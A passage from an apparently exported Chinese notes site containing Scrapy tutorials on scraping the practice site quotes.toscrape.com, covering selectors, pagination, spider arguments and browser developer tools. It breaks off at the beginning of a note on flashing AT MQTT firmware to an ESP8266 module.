		&lt;a class=&quot;tag&quot; href=&quot;/tag/thinking/page/1/&quot;&gt;thinking&lt;/a&gt;
		&lt;a class=&quot;tag&quot; href=&quot;/tag/world/page/1/&quot;&gt;world&lt;/a&gt;
	&lt;/div&gt;
&lt;/div&gt;
</code></pre>
<p>我们可以在 Scrapy shell 中一步步找出我们想要的数据：</p>
<pre><code class="language-python">scrapy shell 'https://quotes.toscrape.com'

In [1]: response.css(&quot;div.quote&quot;)
Out[1]:
[&lt;Selector xpath=&quot;descendant-or-self::div[@class and contains(concat(' ', normalize-space(@class), ' '), ' quote ')]&quot; data='&lt;div class=&quot;quote&quot; itemscope itemtype...'&gt;,
......

# 定位名言
In [2]: quote = response.css(&quot;div.quote&quot;)[0]

# 定位并验证名言文本
In [3]: text = quote.css(&quot;span.text::text&quot;).get()
In [4]: text
Out[4]: '“The world as we have created it is a process of our thinking. It cannot be changed without changing our thinking.”'

# 定位并验证名言作者
In [5]: author = quote.css(&quot;small.author::text&quot;).get()
In [6]: author
Out[6]: 'Albert Einstein'

# 定位并验证名言标签
In [7]: tags = quote.css(&quot;div.tags a.tag::text&quot;).getall()
In [8]: tags
Out[8]: ['change', 'deep-thoughts', 'thinking', 'world']

# 尝试编写一段这样的逻辑，验证一下我们上面定位是否都准确
In [13]: for quote in response.css(&quot;div.quote&quot;):
    ...:     text = quote.css(&quot;span.text::text&quot;).get()
    ...:     author = quote.css(&quot;small.author::text&quot;).get()
    ...:     tags = quote.css(&quot;div.tags a.tag::text&quot;).getall()
    ...:     print(dict(text=text, author=author, tags=tags))
    ...:
{'text': '“The world as we have created it is a process of our thinking. It cannot be changed without changing our thinking.”', 'author': 'Albert Einstein', 'tags': ['change', 'deep-thoughts', 'thinking', 'world']}
{'text': '“It is our choices, Harry, that show what we truly are, far more than our abilities.”', 'author': 'J.K. Rowling', 'tags': ['abilities', 'choices']}
......
</code></pre>
<p>验证无误后，我们将这段代码写入爬虫的 parse() 中：</p>
<pre><code class="language-python">def parse(self, response):
	for quote in response.css(&quot;div.quote&quot;):
		yield {
			&quot;text&quot;: quote.css(&quot;span.text::text&quot;).get(),
			&quot;author&quot;: quote.css(&quot;small.author::text&quot;).get(),
			&quot;tags&quot;: quote.css(&quot;div.tags a.tag::text&quot;).getall(),
		}
</code></pre>
<p>终端运行以下命令：</p>
<pre><code class="language-sh">scrapy crawl quotes # 还记得吗？quotes是我们编写的爬虫的名字
</code></pre>
<p>你可以在终端输出的日志中读到爬取的内容：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240220033017.webp" alt="image.png"></p>
<h1>存储抓取的数据</h1>
<p>最简单的方式为 Feed exports：</p>
<pre><code class="language-sh">scrapy crawl quotes -O quotes.json
# quotes 为爬虫的名字
# -O （大写字母O) 表示将覆写已经存在的同名文件；-o 则是将内容附加在已经存在的文件
# quotes.json为输出的文件名
</code></pre>
<p>我们可以指定输出文件的格式。上例为 JSON，但是如果我们追加输出到已经存在的文件时会导致生成无效的 json 文件。为此我们可以使用 JSON Lines 格式：</p>
<pre><code class="language-sh">scrapy crawl quotes -o quotes.jsonlines # 亲测jsonl会报错
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240220033829.webp" alt="image.png"></p>
<blockquote>
<p>[!hint] 使用 Scrapy 爬取中文数据时的注意事项<br>
如果爬取数据为中文，存储到文件可能是一堆 unicode 编码。我们可以在 <code>setting.py</code> 中增加：<code>FEED_EXPORT_ENCODING = 'utf-8'</code> 即可</p>
</blockquote>
<h1>递归翻页爬取</h1>
<p>目前我们编写的爬虫是从给定的链接中进行爬取的：</p>
<pre><code class="language-python">&quot;https://quotes.toscrape.com/page/1/&quot;,
&quot;https://quotes.toscrape.com/page/2/&quot;
</code></pre>
<p>我们可不可以只给出网站首页，然后爬虫自动解析出下一页的链接持续爬取数据呢？</p>
<p>我们可以先定位「下一页」的链接在哪里：</p>
<pre><code class="language-html">&lt;nav&gt;
	&lt;ul class=&quot;pager&quot;&gt;
		&lt;li class=&quot;next&quot;&gt;
			&lt;a href=&quot;/page/2/&quot;&gt;Next &lt;span aria-hidden=&quot;true&quot;&gt;→&lt;/span&gt;&lt;/a&gt;
		&lt;/li&gt;
	&lt;/ul&gt;
&lt;/nav&gt;
</code></pre>
<p>使用 Scrapy shell：</p>
<pre><code class="language-python">scrapy shell 'https://quotes.toscrape.com'

# 定位链接
In [1]: response.css('li.next a').get()
Out[1]: '&lt;a href=&quot;/page/2/&quot;&gt;Next &lt;span aria-hidden=&quot;true&quot;&gt;→&lt;/span&gt;&lt;/a&gt;'

# 使用CSS的扩展，::attr(href)提取文字
In [2]: response.css(&quot;li.next a::attr(href)&quot;).get()
Out[2]: '/page/2/'

# 我们也可以使用attrib方法
In [3]: response.css(&quot;li.next a&quot;).attrib[&quot;href&quot;]
Out[3]: '/page/2/'
</code></pre>
<p>因此，我们的爬虫可以这样写：</p>
<pre><code class="language-python">import scrapy


class QuotesSpider(scrapy.Spider):
    name = &quot;quotes&quot;
    start_urls = [
        &quot;https://quotes.toscrape.com&quot;,
    ]

    def parse(self, response):
        for quote in response.css(&quot;div.quote&quot;):
            yield {
                &quot;text&quot;: quote.css(&quot;span.text::text&quot;).get(),
                &quot;author&quot;: quote.css(&quot;small.author::text&quot;).get(),
                &quot;tags&quot;: quote.css(&quot;div.tags a.tag::text&quot;).getall(),
            }
		# 当第一个页面遍历完毕后，尝试获取第二个页面的链接
        next_page = response.css(&quot;li.next a::attr(href)&quot;).get()
        if next_page is not None:
            next_page = response.urljoin(next_page)
            # 新页面的回调函数依然是parse()
            yield scrapy.Request(next_page, callback=self.parse)
            # 这里我们yeild了一个scrapy.Request类，Scrapy会调度这个请求，并为这个请求安排回调方法（这里指的是self.parse）
</code></pre>
<p>关于 <a href="https://docs.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Response.urljoin">urljoin()</a> 的测试：</p>
<pre><code class="language-python">web1 = &quot;https://quotes.toscrape.com&quot;
web2 = &quot;https://quotes.toscrape.com/page/1/&quot;
web3 = &quot;https://quotes.toscrape.com/a/b/c/d/&quot;
href = &quot;/page/2/&quot;
print(urllib.parse.urljoin(web1, href))
print(urllib.parse.urljoin(web2, href))
print(urllib.parse.urljoin(web3, href))
# 结果都是https://quotes.toscrape.com/page/2/
</code></pre>
<p>我们还可以对上面的代码进行简化。我们将最后四行代码（从 next_page 开始）简化为：</p>
<pre><code class="language-python"># 方法 1
# follow 省去了对urljoin的调用，并直接返回Request的实例
next_page = response.css(&quot;li.next a::attr(href)&quot;).get()
if next_page is not None:
	yield response.follow(next_page, callback=self.parse)

# 方法 2
# 直接向follow传入css选择器
for href in response.css(&quot;ul.pager a::attr(href)&quot;):
    yield response.follow(href, callback=self.parse)

# 方法 3
# 对于&lt;a&gt;标签，follow可以直接提取其href属性
for a in response.css(&quot;ul.pager a&quot;):
    yield response.follow(a, callback=self.parse)

# 方法 4 
# 我们可以直接使用follow_all把选择器全部传入，省去for
anchors = response.css(&quot;ul.pager a&quot;)
yield from response.follow_all(anchors, callback=self.parse)
</code></pre>
<blockquote>
<p>有一些网站不存在翻页，而是采用无限滚动的方法实现更多内容的浏览（比如这个网站：<a href="https://quotes.toscrape.com/scroll">Quotes to Scrape</a>）。在部分简单的情况下，爬取方法可以参考 <a href="#3753778605" title="Scrapy-充分利用浏览器中的开发者工具" class="record-link ">Scrapy-充分利用浏览器中的开发者工具</a> 这篇文章。</p>
</blockquote>
<p>这里附一个XPath版本的爬虫：</p>
<pre><code class="language-python"># -*- coding: utf-8 -*-
import scrapy

class ToScrapeSpiderXPath(scrapy.Spider):
    name = 'toscrape-xpath'
    start_urls = [
        'http://quotes.toscrape.com/',
    ]

    def parse(self, response):
        for quote in response.xpath('//div[@class=&quot;quote&quot;]'):
            yield {
                'text': quote.xpath('./span[@class=&quot;text&quot;]/text()').extract_first(),
                'author': quote.xpath('.//small[@class=&quot;author&quot;]/text()').extract_first(),
                'tags': quote.xpath('.//div[@class=&quot;tags&quot;]/a[@class=&quot;tag&quot;]/text()').extract()
            }

        next_page_url = response.xpath('//li[@class=&quot;next&quot;]/a/@href').extract_first()
        if next_page_url is not None:
            yield scrapy.Request(response.urljoin(next_page_url))
</code></pre>
<p>一个简单的递归爬取名人名言的小爬虫到这里就结束了。继续阅读将学习更多内容。</p>
<h1>【案例练习】爬取作者信息</h1>
<p>以下这个例子将爬取作者信息。我们可以新建一个爬虫 <code>author_spider.py</code>：</p>
<pre><code class="language-python">import scrapy

class AuthorSpider(scrapy.Spider):
    name = &quot;author&quot;

    start_urls = [&quot;https://quotes.toscrape.com/&quot;]

    def parse(self, response):
        author_page_links = response.css(&quot;.author + a&quot;) # 相邻兄弟选择器 +
        yield from response.follow_all(author_page_links, self.parse_author)

        pagination_links = response.css(&quot;li.next a&quot;)
        yield from response.follow_all(pagination_links, self.parse)

    def parse_author(self, response):
        def extract_with_css(query):
            return response.css(query).get(default=&quot;&quot;).strip()

        yield {
            &quot;name&quot;: extract_with_css(&quot;h3.author-title::text&quot;),
            &quot;birthdate&quot;: extract_with_css(&quot;.author-born-date::text&quot;),
            &quot;bio&quot;: extract_with_css(&quot;.author-description::text&quot;),
        }
</code></pre>
<p>执行命令：</p>
<pre><code class="language-sh">scrapy crawl author -O author.jsonlines
</code></pre>
<p>值得一提的是，尽管一些名言都指向同一个作者页面，Scrapy 会检查这些重复链接并避免多次访问服务器。</p>
<h1>【进阶小知识】使用爬虫参数</h1>
<p>我们可以使用 <code>-a</code> 选项向爬虫提供参数。这个参数会直接传入爬虫的 <code>__init__</code> 方法，使之成为爬虫的属性。比如在这个例子中：</p>
<pre><code class="language-python">import scrapy

class QuotesSpider(scrapy.Spider):
    name = &quot;quotes&quot;

    def start_requests(self):
        url = &quot;https://quotes.toscrape.com/&quot;
		tag = getattr(self, &quot;tag&quot;, None) # 关键 
        if tag is not None:
            url = url + &quot;tag/&quot; + tag
        yield scrapy.Request(url, self.parse)

    def parse(self, response):
        for quote in response.css(&quot;div.quote&quot;):
            yield {
                &quot;text&quot;: quote.css(&quot;span.text::text&quot;).get(),
                &quot;author&quot;: quote.css(&quot;small.author::text&quot;).get(),
            }

        next_page = response.css(&quot;li.next a::attr(href)&quot;).get()
        if next_page is not None:
            yield response.follow(next_page, self.parse)
</code></pre>
<p>执行：</p>
<pre><code class="language-sh">scrapy crawl quotes -O quotes-humor.json -a tag=humor
</code></pre>
<p>爬虫只会浏览 humor 标签的网页，即 <a href="https://quotes.toscrape.com/tag/humor">https://quotes.toscrape.com/tag/humor</a> 。</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://docs.scrapy.org/en/latest/intro/tutorial.html">Scrapy Tutorial — Scrapy 2.11.1 documentation</a></li>
<li><a href="https://github.com/scrapy/quotesbot">scrapy/quotesbot: This is a sample Scrapy project for educational purposes (github.com)</a></li>
<li><a href="https://segmentfault.com/blog/rui0908">Scrapy详解 - SegmentFault 思否</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/144350043">Python最火爬虫框架Scrapy入门与实践 - 知乎 (zhihu.com)</a></li>
<li><a href="https://blog.csdn.net/cainiao_python/article/details/119224134">从原理到实战，一份详实的 Scrapy 爬虫教程-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/ck784101777/article/details/104468780">Scrapy爬虫框架，入门案例（非常详细）_scrapy爬虫案例python-CSDN博客</a></li>
<li><a href="https://www.zhihu.com/question/21414417">scrapy 抓取的中文结果乱码，请问如何解决？ - 知乎 (zhihu.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="3753778605">
                            <a href="#3753778605">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>Scrapy-充分利用浏览器中的开发者工具</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>如果你掌握浏览器开发者工具的使用，我们可以很轻松的完成这件事情（详看 <a href="#3753778605" title="Scrapy-充分利用浏览器中的开发者工具" class="record-link highlight">Scrapy-充分利用浏览器中的开发者工具</a>）。</p>
</blockquote>
<blockquote>
<p>有一些网站不存在翻页，而是采用无限滚动的方法实现更多内容的浏览（比如这个网站：<a href="https://quotes.toscrape.com/scroll">Quotes to Scrape</a>）。在部分简单的情况下，爬取方法可以参考 <a href="#3753778605" title="Scrapy-充分利用浏览器中的开发者工具" class="record-link highlight">Scrapy-充分利用浏览器中的开发者工具</a> 这篇文章。</p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3753778605">
                            <a href="#3753778605">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>Scrapy-充分利用浏览器中的开发者工具</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>如果你对 Scrapy 还不熟悉，可以先看这一篇文章：<a href="#3476966011" title="Scrapy-入门篇" class="record-link highlight">Scrapy-入门篇</a>。</p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="3753778605" class="record">
            <header>
                <h1 class="record-title">Scrapy-充分利用浏览器中的开发者工具</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, 核心协同</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('python');">python</button>
                    
                    <button class="btn" onclick="activeTag('Scrapy');">Scrapy</button>
                    
                    <button class="btn" onclick="activeTag('Edge');">Edge</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>2/20/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240221024125.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>浏览器开发者工具基础向教程</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>dfbe1dad</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>如今大多数的浏览器（Edge、Chrome、Firefox 等）都带有开发者工具。本篇文章简单介绍利用开发者工具辅助我们选择需要爬取的内容，方便 Scrapy 爬虫的开发。</p>
<blockquote>
<p>如果你对 Scrapy 还不熟悉，可以先看这一篇文章：<a href="#3476966011" title="Scrapy-入门篇" class="record-link ">Scrapy-入门篇</a>。</p>
</blockquote>
<blockquote>
<p>[!warning] 查阅实时浏览器 DOM 的注意事项<br>
由于开发者工具工作于实时浏览器 DOM，因此你在工具中看到的页面代码并非原始 HTML 代码，它可能被浏览器清除过一些内容或者执行了某些 Javascript 脚本。就比如在 Firefox 浏览器，它会自动为表格增加 <code>&lt;tbody&gt;</code> 标签。Scrapy 不会修改原 HTML，因此如果你的爬虫 XPath 表达式含有 <code>&lt;tbody&gt;</code>，你将不会提取到任何信息。<br>
正因此，使用 Scrapy 时你需要注意：</p>
<ol>
<li>当你在为 Scrapy 寻找 XPath、查阅 DOM 时，请取消激活 JavaScript。例如在 Edge 浏览器中设置方法为打开开发者工具设置（左下角三个圆点），首选项&gt;调试程序&gt;禁用 JavaScript。</li>
<li>不要使用完整的 XPath 表达式。使用相对路径，或者基于属性（比如 <code>id</code>，<code>class</code>，<code>width</code> 等）进行筛选，或者其它可以助于定位的特性如 <code>contains(@href, 'image')</code></li>
<li>不要在 XPath 表达式中使用 <code>&lt;tbody&gt;</code> 元素，除非你知道自己正在做什么。</li>
</ol>
</blockquote>
<h1>检查元素</h1>
<p>以英文名人名言网站 <a href="https://quotes.toscrape.com/">quotes.toscrape.com</a> 为例。假如我们需要提取其中的名言，我们可以直接右击名言，选择弹出菜单中的「检查」即可打开开发者工具。此时开发者工具直接打开「元素」页面，对应的名言将高亮显示。</p>
<blockquote>
<p>打开开发者工具的快捷键为<kbd>F12</kbd></p>
</blockquote>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240221002646.webp" alt="image.png"></p>
<p>鼠标在「元素」中划过 HTML 块时，左侧对应的元素将高亮显示。按下「检查」按钮（快捷键 Ctrl+Shift+C，可以随时呼出开发者工具面板），可以实现鼠标划过网页时高亮显示 HTML 块，单击即可固定。此外，右键某一个 HTML 块，选择「滚动到视图」也可以轻松定位元素在网页中的位置。</p>
<p>我们可以手动展开或折叠 HTML 代码，右键我们想要爬取的内容，选择复制 XPath。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240221003616.webp" alt="image.png"></p>
<p>这样你就可以轻松定位需要爬取元素的位置。</p>
<p>我们可以现在打开 Scrapy shell 验证一下：</p>
<pre><code class="language-python">scrapy shell &quot;https://quotes.toscrape.com/&quot;

In [1]: response.xpath(&quot;/html/body/div/div[2]/div[1]/div[1]/span[1]/text()&quot;).getall()
Out[1]: ['“The world as we have created it is a process of our thinking. It cannot be changed without changing our thinking.”']
</code></pre>
<p>但是这个完整 XPath 表达显得不太灵活。通过开发者工具我们观察到网站中一句名言的结构是这样的：</p>
<pre><code class="language-html">&lt;div class=&quot;quote&quot; itemscope=&quot;&quot; itemtype=&quot;http://schema.org/CreativeWork&quot;&gt;
	&lt;span class=&quot;text&quot; itemprop=&quot;text&quot;&gt;“The world as we have created it is a process of our thinking. It cannot be changed without changing our thinking.”&lt;/span&gt;
	&lt;span&gt;by &lt;small class=&quot;author&quot; itemprop=&quot;author&quot;&gt;Albert Einstein&lt;/small&gt;
	&lt;a href=&quot;/author/Albert-Einstein&quot;&gt;(about)&lt;/a&gt;
	&lt;/span&gt;
	&lt;div class=&quot;tags&quot;&gt;
		Tags:
		&lt;meta class=&quot;keywords&quot; itemprop=&quot;keywords&quot; content=&quot;change,deep-thoughts,thinking,world&quot;&gt; 
		&lt;a class=&quot;tag&quot; href=&quot;/tag/change/page/1/&quot;&gt;change&lt;/a&gt;
		&lt;a class=&quot;tag&quot; href=&quot;/tag/deep-thoughts/page/1/&quot;&gt;deep-thoughts&lt;/a&gt;
		&lt;a class=&quot;tag&quot; href=&quot;/tag/thinking/page/1/&quot;&gt;thinking&lt;/a&gt;
		&lt;a class=&quot;tag&quot; href=&quot;/tag/world/page/1/&quot;&gt;world&lt;/a&gt; 
	&lt;/div&gt;
&lt;/div&gt;
</code></pre>
<p>一个页面就有 10 个这样的结构（10 句名言），每个结构里面都包含：两个 <code>&lt;span&gt;</code>，一个 <code>&lt;div&gt;</code>。</p>
<p>利用一些 XPath 知识我们可以定位名言位置。在 Scrapy shell 中输入：</p>
<pre><code class="language-python">In [2]: response.xpath('//span[has-class(&quot;text&quot;)]/text()').getall()
Out[2]:
['“The world as we have created it is a process of our thinking. It cannot be changed without changing our thinking.”',
 '“It is our choices, Harry, that show what we truly are, far more than our abilities.”',
 '“There are only two ways to live your life. One is as though nothing is a miracle. The other is as though everything is a miracle.”'......
</code></pre>
<h1>网络工具</h1>
<p>有时候我们爬取的网页是动态网页，这些网页的许多部分是通过多次网络请求实现的。考虑这个例子： <a href="https://quotes.toscrape.com/scroll">quotes.toscrape.com/scroll</a>。与之前的网站不一样的是，这个网站的页面可以无限滚动，不需要手动点击翻页按钮。如果我们尝试在 Scrapy shell 中打开这个网页，我们会发现网站除了一些基本的框架以外啥也没有。</p>
<pre><code class="language-python">scrapy shell &quot;quotes.toscrape.com/scroll&quot;

In [1]: view(response)
Out[1]: True
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240221015211.webp" alt="image.png|450"></p>
<p>我们重新在浏览器输入网址 <a href="http://quotes.toscrape.com/scroll">quotes.toscrape.com/scroll</a> 。按<kbd>F12</kbd>打开开发者工具，点击「网络」选项卡。刷新页面，我们将看到在这个过程中的几条网络请求。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240221020816.webp" alt="image.png|475"></p>
<p>点击名称为 <code>scroll</code> 的请求，点击弹出的「预览」标签，我们可以看到这个请求渲染出的 HTML 画面（是不是和之前用 <code>view(response)</code> 我们看到的一样？），点击「响应」标签我们可以看到该请求得到的响应内容。</p>
<p>观察其它的请求，发现有一些 css 和 js 类型的文件，但我们真正感兴趣的是名称为 <code>quotes?page=1</code> 的类型为 <code>xhr</code> 的文件（某些浏览器为 <code>json</code>）。点击这个请求，通过「标头」标签中可以知道请求的 URL 为： <a href="https://quotes.toscrape.com/api/quotes?page=1">https://quotes.toscrape.com/api/quotes?page=1</a> 。我们使用浏览器再新建标签页访问这个链接可以直接查看这个 json 文件的内容，这样做也便于查看。</p>
<pre><code class="language-json">{
    &quot;has_next&quot;: true,
    &quot;page&quot;: 1,
    &quot;quotes&quot;: [
        {
            &quot;author&quot;: {
                &quot;goodreads_link&quot;: &quot;/author/show/9810.Albert_Einstein&quot;,
                &quot;name&quot;: &quot;Albert Einstein&quot;,
                &quot;slug&quot;: &quot;Albert-Einstein&quot;
            },
            &quot;tags&quot;: [
                &quot;change&quot;,
                &quot;deep-thoughts&quot;,
                &quot;thinking&quot;,
                &quot;world&quot;
            ],
......
</code></pre>
<p>观察得知：</p>
<ul>
<li>URL 参数中 <code>page=1</code> 应该表示页面标号</li>
<li><code>has_next</code> 属性应该是暗示了当前页面还有没有下一页，有则为 <code>true</code>。（你可以看看 <a href="https://quotes.toscrape.com/api/quotes?page=10">https://quotes.toscrape.com/api/quotes?page=10</a> ）</li>
<li><code>quotes</code> 是一个包含当前页面名言的列表。</li>
</ul>
<p>据此，我们可以编写出这样的爬虫：</p>
<pre><code class="language-python">import scrapy
import json

class QuoteSpider(scrapy.Spider):
    name = &quot;quote_scoll&quot;
    allowed_domains = [&quot;quotes.toscrape.com&quot;]
    page = 1
    start_urls = [&quot;https://quotes.toscrape.com/api/quotes?page=1&quot;] # 从第一页开始

    def parse(self, response):
        data = json.loads(response.text)
        for quote in data[&quot;quotes&quot;]:
            yield {&quot;quote&quot;: quote[&quot;text&quot;]}
        if data[&quot;has_next&quot;]: # 检查has_next字段值
            self.page += 1
            url = f&quot;https://quotes.toscrape.com/api/quotes?page={self.page}&quot;
            yield scrapy.Request(url=url, callback=self.parse)
</code></pre>
<p>执行：</p>
<pre><code class="language-sh">scrapy crawl quote_scoll -O quote_scoll.jsonlines
</code></pre>
<h1>【进阶小知识】使用 cURL</h1>
<p>在更复杂的情况中，我们可能需要增加 <code>header</code> 和 <code>cookies</code> 才能使爬虫继续生成新的 URL。我们可以利用开发者工具中将请求导出为 cURL 的格式：在「网络」标签页中右键请求，选择「复制为 cURL」。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240221022843.webp" alt="image.png|500"></p>
<p>然后利用这个网站，将 cURL 翻译为 Scrapy 中的 <code>Request</code>：<a href="https://michael-shub.github.io/curl2scrapy/">curl2scrapy - cURL command -&gt; Scrapy request translator. (michael-shub.github.io)</a></p>
<p>经过一些细枝末节的调整，我们的爬虫可以是这样的：</p>
<pre><code class="language-python">import scrapy
import json

from scrapy import Request

##### 翻译后的 cURL 内容 #######

url = 'https://quotes.toscrape.com/api/quotes?page=1'

headers = {
    &quot;authority&quot;: &quot;quotes.toscrape.com&quot;,
    &quot;accept&quot;: &quot;*/*&quot;,
    &quot;accept-language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;,
    &quot;cache-control&quot;: &quot;no-cache&quot;,
    &quot;pragma&quot;: &quot;no-cache&quot;,
    &quot;referer&quot;: &quot;https://quotes.toscrape.com/scroll&quot;,
    &quot;sec-ch-ua&quot;: &quot;\&quot;Not A(Brand\&quot;;v=\&quot;99\&quot;, \&quot;Microsoft Edge\&quot;;v=\&quot;121\&quot;, \&quot;Chromium\&quot;;v=\&quot;121\&quot;&quot;,
    &quot;sec-ch-ua-mobile&quot;: &quot;?0&quot;,
    &quot;sec-ch-ua-platform&quot;: &quot;\&quot;Windows\&quot;&quot;,
    &quot;sec-fetch-dest&quot;: &quot;empty&quot;,
    &quot;sec-fetch-mode&quot;: &quot;cors&quot;,
    &quot;sec-fetch-site&quot;: &quot;same-origin&quot;,
    &quot;user-agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0&quot;,
    &quot;x-requested-with&quot;: &quot;XMLHttpRequest&quot;
}

request = Request(
    url=url,
    method='GET',
    dont_filter=True,
    headers=headers,
)

######## END ########

class QuoteSpider(scrapy.Spider):
    name = &quot;quote_scoll&quot;
    allowed_domains = [&quot;quotes.toscrape.com&quot;]
    page = 1

    # 还记得start_requests函数吗？
    def start_requests(self):
        return [request]

    def parse(self, response):
        data = json.loads(response.text)
        for quote in data[&quot;quotes&quot;]:
            yield {&quot;quote&quot;: quote[&quot;text&quot;]}
        if data[&quot;has_next&quot;]:
            self.page += 1
            url = f&quot;https://quotes.toscrape.com/api/quotes?page={self.page}&quot;
            yield scrapy.Request(url=url, callback=self.parse)
</code></pre>
<h1>本文参考</h1>
<ul>
<li><a href="https://docs.scrapy.org/en/latest/topics/developer-tools.html#topics-developer-tools">Using your browser’s Developer Tools for scraping — Scrapy 2.11.1 documentation</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="3476966011">
                            <a href="#3476966011">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>Scrapy-入门篇</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>如果你对 Scrapy 还不熟悉，可以先看这一篇文章：<a href="#3476966011" title="Scrapy-入门篇" class="record-link highlight">Scrapy-入门篇</a>。</p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3476966011">
                            <a href="#3476966011">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>Scrapy-入门篇</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>如果你掌握浏览器开发者工具的使用，我们可以很轻松的完成这件事情（详看 <a href="#3753778605" title="Scrapy-充分利用浏览器中的开发者工具" class="record-link highlight">Scrapy-充分利用浏览器中的开发者工具</a>）。</p>
</blockquote>
<blockquote>
<p>有一些网站不存在翻页，而是采用无限滚动的方法实现更多内容的浏览（比如这个网站：<a href="https://quotes.toscrape.com/scroll">Quotes to Scrape</a>）。在部分简单的情况下，爬取方法可以参考 <a href="#3753778605" title="Scrapy-充分利用浏览器中的开发者工具" class="record-link highlight">Scrapy-充分利用浏览器中的开发者工具</a> 这篇文章。</p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2777136240" class="record">
            <header>
                <h1 class="record-title">ESP8266 烧写 AT MQTT 固件</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>嵌入式</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('ESP8266');">ESP8266</button>
                    
                    <button class="btn" onclick="activeTag('UST-TTL');">UST-TTL</button>
                    
                    <button class="btn" onclick="activeTag('MQTT');">MQTT</button>
                    
                    <button class="btn" onclick="activeTag('物联网');">物联网</button>
                    
                    <button class="btn" onclick="activeTag('WIFI');">WIFI</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/1/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240404230231.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>记录一下 ESP8266 烧写固件的基本步骤。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>a587bc70</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>文章开头简单介绍 ESP8266（引自 <a href="https://www.zhihu.com/people/yychuyu">知乎用户</a>）。</p>
<p>ESP8266 是一个非常强大的 WIFI 模块，可以利用串口与单片机进行通讯，从而编程实现控制 ESP8266。利用 ESP8266 可以访问一些 API，获取天气信息或者完成网络授时，也可以连接云平台进行开发。不过因为是串口传输，速度较慢，不能用来传输图像、视频这些大容量的数据，但是传些传感器数据还是绰绰有余的。</p>
<p>我们常说的 ESP8266 是指 ESP8266 WIFI 模块，它是物联网和嵌入式开发常用的模块，其中 ESP8266 是 WIFI 模块的芯片型号。</p>
<p>ESP8266 有 ESP-01/01S/07/07S/12E/12F/12S 等规格，还有正点原子自研的 ATK-ESP8266 （修改了固件及模组引脚）。</p>
<h1>材料准备</h1>
<p>本文所需材料：</p>
<ul>
<li>USB 转 TTL。用于烧写固件及测试。</li>
<li>ESP8266 模块（ESP-01S）</li>
<li>母对母、公对母（可选）杜邦线若干</li>
<li>（可选）稳定的 3V3 电源供应</li>
